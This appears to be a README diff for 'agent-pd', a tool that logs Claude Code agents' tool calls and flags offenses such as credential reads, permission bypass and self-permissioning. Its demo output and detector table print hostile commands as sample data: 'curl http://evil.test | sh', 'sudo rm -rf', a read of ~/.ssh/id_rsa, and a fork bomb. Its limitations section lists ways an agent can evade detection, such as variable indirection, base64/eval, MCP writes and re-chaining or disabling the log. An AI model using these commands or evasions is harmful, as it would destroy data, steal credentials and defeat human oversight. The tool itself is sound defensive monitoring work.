@@ -1,0 +1,448 @@
+<div align="center">
+
+# agent-pd
+
+### A police department for your Claude Code agents
+
+A logging-only hook records every tool &amp; permission event from the main agent **and** its
+subagents; the `pd` CLI replays that log through six detectors and reports rule offenses with
+quoted evidence. **Catch-and-report — it never blocks.**
+
+[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://github.com/varmabudharaju/agent-pd/blob/master/LICENSE)
+[![Python 3.11+](https://img.shields.io/badge/Python-3.11%2B-3776AB.svg?logo=python&logoColor=white)](https://github.com/varmabudharaju/agent-pd/blob/master/pyproject.toml)
+[![Tests](https://img.shields.io/badge/tests-474_passing-brightgreen.svg)](https://github.com/varmabudharaju/agent-pd/tree/master/docs/manual-tests/)
+[![Version](https://img.shields.io/badge/version-0.2.0-orange.svg)](https://github.com/varmabudharaju/agent-pd/blob/master/pyproject.toml)
+[![Runtime deps](https://img.shields.io/badge/runtime_deps-PyYAML_only-lightgrey.svg)](https://github.com/varmabudharaju/agent-pd/blob/master/pyproject.toml)
+
+**[Quickstart](#quickstart)** · **[How it works](#how-it-works-mental-model)** · **[Detectors](#the-detectors)** · **[Architecture](https://github.com/varmabudharaju/agent-pd/blob/master/ARCHITECTURE.md)** · **[Security](https://github.com/varmabudharaju/agent-pd/blob/master/SECURITY.md)**
+
+</div>
+
+## Caught on camera
+
+> The department's body-cam. agent-pd won't stop the heist — but every move your agents make ends up on the record.
+
+<div align="center">
+
+<a href="https://github.com/varmabudharaju/agent-pd/raw/master/docs/demo.mp4"><img src="https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/demo.gif" width="80%" alt="agent-pd demo — the police scanner catching agents in the act"></a>
+
+<sub><i>▶ <a href="https://github.com/varmabudharaju/agent-pd/raw/master/docs/demo.mp4">Watch the full clip with sound</a></i></sub>
+
+</div>
+
+![capture vs. read](https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/diagrams/02-two-phase-flow.png)
+
+> **Flight recorder + police scanner, not a firewall.** If you need to *stop* an action, that
+> stays with Claude Code's permission prompts or an OS sandbox. agent-pd tells you what an agent
+> did — faithfully, after the fact or live as it happens.
+
+**Highlights**
+
+- **Covers the main agent + every subagent**, including those spawned by Claude Code's new
+  dynamic **Workflow** tool (verified against recorded `workflow-subagent` hook events).
+- **Six deterministic detectors** at **zero token cost** — denied calls, out-of-scope &amp;
+  credential access, permission bypass, self-permissioning, disallowed tools, off-task work.
+- **Tamper-evident audit log** (hash-chained) with an optional **off-host append-only sink**.
+- **Sessions are named, not UUIDs** — `pd list` and `pd watch` show each session's project
+  directory and first user prompt, derived from data already in the logs (works retroactively).
+- **Honest by design** — it raises the bar; it is **not** a sandbox. See [SECURITY.md](https://github.com/varmabudharaju/agent-pd/blob/master/SECURITY.md).
+
+**What it looks like** — `pd watch --all` across three concurrent sessions (three projects,
+main agents + subagents with their briefs, two genuine flags and one borderline search among
+the ordinary work):
+
+<img src="https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/screenshots/demo/03-pd-watch-all.png" width="100%" alt="pd watch --all: merged live feed across three sessions — § intro line per session, agent banners with briefs, two genuine flags (a credentials read and a denied curl|sh) and one off_task review"/>
+
+> Every screenshot in this README is a real Terminal capture of the real engine replaying a
+> seeded three-session fleet — reproduce them yourself with
+> [`examples/demo-sessions.sh`](https://github.com/varmabudharaju/agent-pd/blob/master/examples/demo-sessions.sh).
+
+---
+
+## Why it exists
+
+Claude Code agents can read files, run shell commands, and spawn subagents. Most of that is
+fine — but you usually find out what an agent *actually did* only by scrolling a transcript,
+and **denied calls never reach the transcript at all** (Claude Code kills them first). agent-pd
+installs a hook that records every event to a per-session audit log, then gives you tools to
+ask: *did any agent go out of scope, touch credentials, try to escalate, edit its own config,
+use a tool it wasn't allowed, or wander off its brief?*
+
+---
+
+## How it works (mental model)
+
+```
+ SETUP              CAPTURE (automatic, every session)        READ (per session or --all)
+ pd install-hook  →  hook fires on every tool call        →   pd report   (forensic)
+      │                    │                                   pd watch    (live scanner)
+ settings.json       ~/.claude/pd/audit/<session>.jsonl        pd judge    (opt-in LLM pass)
+```
+
+<p align="center">
+  <img src="https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/diagrams/01-system-context.png" width="560" alt="agent-pd system context">
+</p>
+
+> For the full picture — system context, component, sequence, detector-pipeline, and
+> integrity diagrams (with rendered images) — see [ARCHITECTURE.md](https://github.com/varmabudharaju/agent-pd/blob/master/ARCHITECTURE.md).
+
+- **The hook is a dumb, crash-safe recorder.** Registered globally in `~/.claude/settings.json`
+  on PostToolUse / PermissionDenied / SubagentStart / SubagentStop. On each event it appends one
+  normalized, hash-chained line to a **per-session** audit file and **always exits 0** — it never
+  blocks, never loses an event, records all sessions concurrently.
+- **All the intelligence is in the reader.** `pd report` / `pd watch` correlate the audit log
+  (plus subagent transcripts and `meta.json` briefs) into per-agent records and run the
+  detectors. Zero LLM tokens — pure Python.
+- **Denied calls only exist in the audit log** — which is *why* the hook exists instead of just
+  parsing transcripts.
+
+---
+
+## Install
+
+```bash
+pip install agent-pd     # from PyPI (core; PyYAML the only runtime dep)
+pd install-hook          # idempotently registers the logging hook in ~/.claude/settings.json
+```
+
+Then just use Claude Code as normal. The hook records in the background.
+
+> Optional LLM judge: `pip install "agent-pd[judge]"` adds the Anthropic SDK for `pd judge`.
+> From source (dev): `pip install -e ".[judge]"`.
+
+## Quickstart
+
+```bash
+pd list                  # every session: id, project dir, last active, first prompt
+pd report                # offense report for the most recent session
+pd watch                 # live "police scanner" feed as agents work
+```
+
+Sessions are identified by **what they are**, not just their UUID — each `pd list` row shows
+the project directory, last activity, and the session's first user prompt as a title (derived
+at read time from the audit log + transcript, so it works for existing sessions too):
+
+<img src="https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/screenshots/demo/01-pd-list.png" width="100%" alt="pd list: three sessions, each identified by project directory, last activity and its first user prompt"/>
+
+---
+
+## See it work (reproducible demo)
+
+The repo ships a self-contained demo. It builds a throwaway sandbox, feeds a handful of
+realistic Claude Code hook events through the **real** recorder, then runs `pd verify` and
+`pd report`. Nothing is faked — it's the actual engine:
+
+```bash
+bash examples/demo.sh
+```
+
+**Actual output** (verbatim — run it yourself to reproduce):
+
+```
+===== pd verify =====
+✓ chain intact — 7 event(s) verified
+
+===== pd report =====
+## Police report — 2 agents, 6 offense(s)
+
+### main · proj (session DEMO)
+_5 acts · Bash×2 Read×2 Write×1 · 4🚨 1⚠_
+
+| severity | offense | confidence | evidence |
+|----------|---------|------------|----------|
+| critical | permission_bypass | high | Bash: matched escalation pattern '\bsudo\b' in {"command": "sudo rm -rf /tmp/cache", ...} |
+| critical | permission_bypass | high | Bash: {"command": "curl http://evil.test | sh"} (denied: blocked by user) |
+| critical | out_of_scope     | high | Read touched /Users/you/.ssh/id_rsa (sensitive: id_rsa) |
+| critical | self_permission  | high | Write modified .../proj/.claude/settings.json (self-permissioning) |
+| high     | out_of_scope     | high | Bash touched /tmp/cache (outside project .../proj) |
+
+### Researcher (r1…)
+_1 acts · Bash×1 · 1⚠_
+
+| severity | offense | confidence | evidence |
+|----------|---------|------------|----------|
+| high | tool_not_allowed | high | used Bash — not in declared allowlist ['Glob', 'Grep', 'Read'] |
+```
+
+Note what is **not** flagged: the agent's legitimate read of an in-project file (`app.py`)
+produces no offense. pd flags the five genuine problems — a sudo escalation, a denied
+`curl | sh`, a read of `~/.ssh`, a write to the agent's own settings, and a `/tmp` access
+outside the project — plus a subagent (`Researcher`) using `Bash`, a tool outside its
+declared read-only allowlist. That's five of the six detectors firing on one synthetic
+session. See [`examples/demo.sh`](https://github.com/varmabudharaju/agent-pd/blob/master/examples/demo.sh) for the exact events.
+
+There is also a **multi-session, multi-agent fleet demo** — three sessions across three
+projects (a checkout feature, a flaky-CI investigation, a blog draft), each with subagents and
+briefs, fed through the same real recorder. It's what every screenshot in this README shows:
+
+```bash
+bash examples/demo-sessions.sh
+export PD_AUDIT_DIR=/tmp/pd-demo-fleet/audit
+pd list  --projects-dir /tmp/pd-demo-fleet/projects
+pd watch --all --replay --projects-dir /tmp/pd-demo-fleet/projects
+```
+
+`pd report` on the fleet's flaky-CI session — per-agent digest, offense table, quoted evidence:
+
+<img src="https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/screenshots/demo/04-pd-report.png" width="100%" alt="pd report for the orders-api session: per-agent digest and offense table with quoted evidence"/>
+
+> **Want to verify it on your own real Claude Code session?** Follow the safe ~15-minute
+> hands-on walkthrough in [`docs/manual-tests/TRY-IT-LIVE.md`](https://github.com/varmabudharaju/agent-pd/blob/master/docs/manual-tests/TRY-IT-LIVE.md).
+
+---
+
+## Commands
+
+```bash
+pd install-hook                       # register the logging hook (one-time)
+pd list                               # every session: id · project · last active · “first prompt”
+
+pd report                             # offense report, most recent session
+pd report --session <id> --format md  # md | json | both
+pd report --verbose                   # full evidence + files-touched per agent
+pd report --agent <id|main>           # focus one agent: digest + every action it took
+
+pd watch                              # live feed, most recent session — streams NEW activity
+                                      #   from now (like tail -f); existing backlog is skipped
+pd watch --replay                     # replay the whole session's backlog first, then tail
+pd watch --all                        # merged feed across ALL sessions (§session tag; an intro
+                                      #   line names each session's project + first prompt)
+pd watch --crimes-only                # quiet unless something's wrong
+pd watch --verbose                    # full commands + reasons, no truncation
+pd watch --session <id> --no-color --no-emoji   # plain terminals / SSH
+
+pd verify                             # check the audit-log hash-chain (most recent session)
+pd verify --all                       # verify every session; exit 2 on tamper/truncation
+                                      # set PD_AUDIT_KEY for HMAC-keyed integrity
+
+pd judge                              # dry run (free): items / agents / ≈token estimate
+pd judge --run --via-claude-code      # confirm off_task flags on your Claude subscription
+pd judge --run --model sonnet --max 20    # or via the metered Anthropic API
+
+pd compact [--session ID] [--prune-older-than DAYS] [--dry-run]
+                                      # gzip old logs (<sid>.jsonl -> .jsonl.gz); skips the active
+                                      # session; lossless for detection. Optional age-based prune.
+
+pd sink push [--session ID] [--all]   # forward un-sent chained events off-host (append-only sink)
+pd sink status [--session ID] [--all] # forwarded/last per session; flags "remote ahead"
+```
+
+---
+
+## The detectors
+
+Six deterministic detectors (zero tokens) plus one opt-in LLM pass.
+
+| Offense | Severity | What it catches | Confidence |
+|---|---|---|---|
+| `permission_bypass` | critical | Denied calls + a **two-tier** Bash scan: never-downgrade catastrophic (`rm -rf /`, fork bomb, `curl\|sh`, `dd of=/dev/…`) stay critical under any allow-rule; downgradable escalation (sudo, `chmod 777`, cwd-wipe) only by a precise rule. | high |
+| `out_of_scope` | high / critical | File **or** Bash path outside the project (auto: git root or cwd), or outside configured `scope_dirs`. Sensitive paths (`~/.ssh`, `~/.aws`, `~/.claude`, `/etc/shadow`, shell history…) are **always critical** and never downgraded. | high |
+| `self_permission` | critical | **Any** agent write to its own control files (`.claude/settings*.json`, `.claude/agents/*.md`, `pd-rules*.yaml`) via any method — Write/Edit/NotebookEdit or Bash `cp`/`mv`/`tee`/`sed`/`python`/`base64`/redirect — regardless of content. | high |
+| `tool_not_allowed` | high | A subagent uses a tool outside its declared `tools:` allowlist (`.claude/agents/<type>.md`). | high |
+| `redundant` | low | Exact-duplicate tool calls (ignores Bash `description` noise). | high |
+| `off_task` | review | Search/query terms vs. the agent's brief, by word-overlap below a threshold. | **low — heuristic** |
+
+The five deterministic detectors are trustworthy and free. `off_task` is intentionally noisy
+and hard-labeled low-confidence — the **judge** (below) turns it into high-confidence verdicts.
+
+### Permission-aware severity
+
+`out_of_scope` and escalation hits are **downgraded to a quiet `info` severity** when the action
+matches a permission **allow-rule** you configured (`permissions.allow` in `~/.claude/settings.json`
+or project `.claude/settings.local.json`) — *authorized → info, unauthorized → full severity*.
+
+Matching is **faithful to Claude Code's own semantics**: shell-operator splitting (a `Bash(git:*)`
+rule does **not** license `git status && rm -rf ~`), command-substitution / backtick extraction,
+redirect targets as a separate authorization, word-boundary prefixes (`npm install:*` ≠
+`npm installmalware`), and gitignore-style globs. Ambiguity resolves **conservatively → not
+permitted** (under-flagging is worse than over-flagging). Two things are **never** downgraded:
+sensitive-path access and categorically-catastrophic commands. A denied call stays critical
+regardless — a denial is unpermitted by definition.
+
+### The off_task judge (`pd judge`) — opt-in, cost-capped
+
+An optional LLM pass that reads each agent's brief and its flagged searches, then confirms or
+drops the noisy `off_task` flags. Built to cost almost nothing:
+
+- **Opt-in** — never runs in the hook or `pd watch`.
+- **Dry-run by default** — prints an estimate; add `--run` to actually call.
+- **Pre-filtered + batched** — only already-flagged items, one API call per agent.
+- **Two backends:** `--via-claude-code` shells out to the headless `claude` CLI (**your Claude
+  subscription, no API key**), or the metered Anthropic API (`pip install -e ".[judge]"` +
+  `ANTHROPIC_API_KEY`). `--model haiku|sonnet|opus` (default haiku), `--max N`.
+
+In the demo fleet, the orders-api subagent rabbit-holed into a CI-infra search with zero
+word-overlap against its brief — the heuristic flags it for review, and the dry run prices
+out exactly what confirming it would cost:
+
+<img src="https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/screenshots/demo/07-pd-judge.png" width="100%" alt="pd judge dry run: the off_task heuristic flagged one borderline search; judging it would cost one batched haiku call — nothing runs without --run"/>
+
+---
+
+## Live view: `pd watch`
+
+A real-time feed of what your agents are doing and which rules they're breaking. The header
+**names the session it attached to** — project directory plus the session's first prompt — so
+attaching to the default (most recent) session is never a mystery:
+
+<img src="https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/screenshots/demo/02-pd-watch-header.png" width="100%" alt="pd watch header naming the watched session: its project directory and first prompt, not just the UUID"/>
+
+Each agent gets a stable color and a banner with its assigned brief; every action is a feed
+line with a severity badge; a live rap-sheet footer tallies crimes per agent. With `--all`
+(merged feed across every session) the first time a session appears it prints a
+`§sid · project · “title”` intro line, so interleaved sessions stay tellable-apart — see the
+fleet screenshot at the top of this README.
+
+`--crimes-only` keeps the feed quiet unless something is actually wrong — only flagged actions
+stream — and Ctrl-C prints a final **rap sheet** tallying every agent in every session:
+
+<img src="https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/screenshots/demo/06-pd-watch-crimes.png" width="100%" alt="pd watch --all --crimes-only: quiet unless something is wrong — only the flagged actions stream, and Ctrl-C prints the final rap sheet tallying every agent in every session"/>
+
+Zero extra dependencies — ANSI only. The full annotated
+screenshot set lives in [docs/test-evidence.md](https://github.com/varmabudharaju/agent-pd/blob/master/docs/test-evidence.md).
+
+---
+
+## Audit-log integrity & off-host sink
+
+Every event carries a `seq` and a `chain = sha256(prev_chain + canonical(event))` (HMAC-SHA256
+if `PD_AUDIT_KEY` is set), computed by the hook under a per-session file lock with a
+`<sid>.head.json` anchor. **`pd verify`** recomputes the chain and reports `✓ intact`,
+`✗ TAMPER DETECTED`, or `✗ TRUNCATED` (exit 2), and holds across `pd compact`. Here's it
+catching both attacks for real — one event deleted from a log's tail, then one byte flipped
+inside a recorded command (the compacted session still verifies):
+
+<img src="https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/screenshots/demo/12-verify-tamper.png" width="100%" alt="pd verify pinpoints both attacks: the truncated session is flagged TRUNCATED, and one flipped byte is flagged TAMPER DETECTED at seq 7, while the compacted session still verifies"/>
+
+This is tamper-**evident**, not tamper-**proof**: a same-user agent with Bash can re-chain the
+whole file. To close the *retroactive-deletion* half of that gap, **`pd sink push`** forwards each
+chained event to an **off-host, append-only destination** (file or http backend; env-only
+`PD_SINK_TOKEN`; `https://` enforced for remote tokens; redirects not followed). Once an event has
+shipped off-host, a later local rewrite can't reach it. **`pd sink status`** flags "remote ahead"
+when more events shipped than remain locally — a truncation signal:
+
+<img src="https://raw.githubusercontent.com/varmabudharaju/agent-pd/master/docs/screenshots/demo/10-sink-remote-ahead.png" width="100%" alt="pd sink: push all chained events to the off-host sink, status shows fully forwarded; after deleting one local event, status flags remote ahead — possible local tampering"/>
+
+> Append-only is a **deployment requirement** pd can't enforce, and the sink does not stop a
+> same-user agent from *forging* entries or *disabling* the hook. Read [SECURITY.md](https://github.com/varmabudharaju/agent-pd/blob/master/SECURITY.md)
+> for the full, honest framing before relying on any of this.
+
+---
+
+## What's lacking (honest limitations)
+
+agent-pd **raises the bar; it is not a sandbox.** A determined same-privilege adversary using
+obfuscation or indirection can evade static detection. Known limits, in plain terms:
+
+- **Obfuscation / indirection evades static detection.** Multi-level `$VAR` chains
+  (`A=/etc/shadow; B=$A; cat $B` — only single-level expansion is followed), `$IFS` / word-split
+  tricks, two-step download-then-exec (`curl -o f url; sh f`), base64/eval-assembled commands, and
+  dynamically-built paths can slip past.
+- **Non-Bash file-write MCP tools bypass `self_permission`.** Only Write/Edit/NotebookEdit and
+  Bash are inspected for control-file writes; a filesystem MCP tool with a different shape could
+  write `.claude/settings.json` undetected.
+- **`off_task` is heuristic** (word-overlap) and can't run on the main agent or on Workflow
+  subagents (no brief). `pd judge` is the trustworthy path.
+- **`~/.config` sensitivity is broad** and can be noisy (it holds innocuous app config too).
+- **Tool *results* aren't surfaced** — the hook captures `tool_input` and an outcome flag, not full
+  `tool_response`, to keep the audit log from bloating. The feed shows what an agent *did*, not its
+  output.
+- **Audit integrity is tamper-evident, not tamper-proof** (above), and the off-host sink's
+  append-only guarantee is the operator's responsibility.
+- **Symlink resolution is best-effort** (the symlink must exist at analysis time).
+- **Sessions that predate the hook** (transcript-only, no `<sid>.jsonl`) don't appear in `pd report`.
+
+The full ledger of shipped / residual / declined items lives in [KNOWN-GAPS.md](https://github.com/varmabudharaju/agent-pd/blob/master/KNOWN-GAPS.md).
+
+## How it can be improved (roadmap)
+
+Prioritized, none blocking — scoped so any one can be picked up independently:
+
+1. **Tool-agnostic control-file detection** — flag *any* tool whose input names a control path in
+   a write-shaped field (closes the MCP `self_permission` gap).
+2. **Multi-level `$VAR` resolution** — iterate variable substitution to a fixed point so 2-hop
+   indirection (`B=$A`) no longer hides a sensitive path.
+3. **Truncate / cap `tool_result`** at capture to keep raw `.jsonl` small.
+4. **Narrow `~/.config` sensitivity** to credential-bearing subpaths (`gh`, `gcloud`, …) to cut noise.
+5. **Sink enhancements** — chunk large backlogs, a syslog backend, and `pd verify --against-sink`
+   read-back reconciliation.
+6. **`pd summary <session>`** — per-agent digest (files touched, time span, tool histogram).
+7. **Judge verdict disk cache** — skip re-judging identical (brief, search) pairs.
+8. **Capture more hook events** (`PostToolUseFailure`, `PreCompact`, `SessionEnd`) to enrich timelines.
+
+---
+
+## Configuration
+
+agent-pd works out of the box with no config — every rule (sensitive paths, escalation
+patterns, severities, the `off_task` threshold) ships as a built-in default. A `pd-rules.yaml`
+file is **optional**, and only needed to override those defaults.
+
+When you do write one, every command **auto-discovers** it — no flag required. On each run `pd`
+looks for `pd-rules.yaml` in this order and uses the first it finds, deep-merged over the
+built-in defaults:
+
+1. the current directory
+2. the enclosing **project root** (the git root above the cwd)
+3. `~/.claude/pd-rules.yaml` (a global default for all projects)
+
+Precedence is **`--rules <path>` › auto-discovered file › built-in defaults** — pass `--rules`
+on any command (including `pd watch`) to point at a specific file and override discovery. See
+`pd-rules.yaml` in this repo for every supported key (`scope_dirs`, sensitive paths, the two
+escalation tiers, severities, `off_task_overlap_threshold`, `storage`, and a `sink` section).
+
+> Lists in `pd-rules.yaml` **replace** the corresponding default list (deep-merge replaces
+> lists, not appends) — so if you set `sensitive_patterns`, include the built-ins you still want.
+
+The off-host sink also reads env overrides: `PD_SINK_TYPE=file|http`, `PD_SINK_PATH` /
+`PD_SINK_URL`, `PD_SINK_TIMEOUT`, and the **env-only** `PD_SINK_TOKEN` (ignored if placed in a
+config file, so it never lands in a checked-in or world-readable file).
+
+## Storage & privacy
+
+```
+~/.claude/pd/audit/<sid>.jsonl      # live capture (hook appends here)
+~/.claude/pd/audit/<sid>.jsonl.gz   # compacted (pd compact, gzip)
+```
+
+The audit log stores **full tool inputs** — file contents and Bash commands — which **may include
+secrets in plaintext**. It lives **outside your repo** (won't be committed by accident) but treat
+it like any sensitive local file. `pd compact` gzips, it does **not** encrypt. Nothing is uploaded
+unless you configure a sink. To clear it: `rm ~/.claude/pd/audit/*.jsonl` (it repopulates as
+sessions run).
+
+**Choosing where logs go.** The default is deliberately a hidden, local, non-repo path. To put
+logs somewhere you choose, set `PD_AUDIT_DIR`, or bake it into the hook at install time:
+
+```bash
+pd install-hook --audit-dir ~/agent-pd-logs   # hook + CLI both use this path
+# or, per shell: export PD_AUDIT_DIR=~/agent-pd-logs
+```
+
+Both the hook (writes) and every `pd` command (reads) honor `PD_AUDIT_DIR` (precedence:
+`--audit-dir` flag › `PD_AUDIT_DIR` › default). A **relative** path is resolved to an absolute
+one when it's set (the install flag bakes the absolute path; `PD_AUDIT_DIR` is absolutized when
+read), so logs always land in one fixed place instead of scattering into whatever directory each
+agent happens to run in. Still, **don't** point it at a repo folder or a cloud-synced directory
+(iCloud/Dropbox) unless you accept that plaintext tool inputs — possibly secrets — will be
+committed or synced off-machine.
+
+## Development
+
+```bash
+pip install --user -e .          # core
+pip install --user -e ".[judge]" # + anthropic SDK (only for the API judge backend)
+python3 -m pytest -q             # 474 tests, pure (no API key needed)
+```
+
+TDD throughout; detectors, render, live, and judge are all unit-tested with no network. For the
+design in depth: [SYSTEM-DESIGN.md](https://github.com/varmabudharaju/agent-pd/blob/master/SYSTEM-DESIGN.md) (formal design doc — goals, components,
+permission model, trade-offs) and [ARCHITECTURE.md](https://github.com/varmabudharaju/agent-pd/blob/master/ARCHITECTURE.md) (diagrams). Honest
+limitations and roadmap live in [KNOWN-GAPS.md](https://github.com/varmabudharaju/agent-pd/blob/master/KNOWN-GAPS.md).
+
+## License
+
+[Apache License 2.0](https://github.com/varmabudharaju/agent-pd/blob/master/LICENSE) © Sai Ram Varma Budharaju. Free to use, modify, and distribute (including
+commercially); retain the copyright and license notice. Includes a patent grant.
+</content>
+</invoke>
